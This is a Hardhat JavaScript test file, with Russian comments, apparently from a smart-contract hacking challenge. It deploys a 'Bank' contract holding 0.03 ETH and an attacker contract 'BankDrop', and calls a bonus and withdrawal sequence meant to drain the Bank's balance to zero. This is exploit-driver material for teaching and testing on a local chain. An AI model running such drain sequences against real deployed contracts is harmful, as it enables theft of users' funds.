const { expect } = require("chai");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

const totalBankCapacity = 0.03

describe("Bank", function () {
  async function deployFixture() {
    const [director] = await ethers.getSigners();
    const Bank = await ethers.deployContract("Bank", [director], {
      value: ethers.parseEther(`${totalBankCapacity}`),
    });

    await Bank.waitForDeployment();

    console.log("Адрес исходного контракта:", Bank.target);
    console.log("Адрес директора:", director.address);

    const contractBalance = await ethers.provider.getBalance(Bank.target);
    console.log(
      "Баланс контракта:",
      ethers.formatEther(contractBalance),
      "ETH"
    );

    return { Bank, director};
  }

  async function deployAttack(sourceBank) {
    const Attack =  await ethers.deployContract("BankDrop", [sourceBank])
    await Attack.waitForDeployment();

    console.log("Адрес атакующего контракта:", Attack.target);

    return Attack
  }

  it("hack", async function () {
    const { Bank, director } = await loadFixture(deployFixture);
    const Attack = await deployAttack(Bank.target)

    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта
    await Attack.addBalance({
      value:  ethers.parseEther(`${0.01}`)
    })

    await Bank.giveBonusToUser(Attack.target, {
      value: ethers.parseEther(`${0.01}`)
    })

    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта
    await Attack.withdraw_with_bonus({
      value:  ethers.parseEther(`${0.01}`)
    })

    // баланс контракта Bank должен стать 0
    await Bank.setCompleted();
    expect(await Bank.completed()).to.equal(true);

    expect(await ethers.provider.getBalance(Bank.target)).to.equal(0);
  });
});
